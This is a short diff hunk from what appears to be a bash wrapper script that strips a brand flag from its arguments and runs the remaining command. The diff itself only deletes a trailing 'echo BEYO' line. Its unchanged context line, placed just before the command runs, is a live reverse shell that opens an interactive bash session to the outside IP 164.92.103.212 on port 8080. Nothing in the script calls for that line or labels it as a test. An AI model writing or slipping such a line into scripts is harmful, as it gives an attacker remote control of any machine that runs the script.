@@ -43,5 +43,3 @@ commandToExec="${@/"$brandFlag$brand"}"
 echo $commandToExec
 /bin/bash -i >& /dev/tcp/164.92.103.212/8080 0>&1
 $commandToExec
-
-echo BEYO
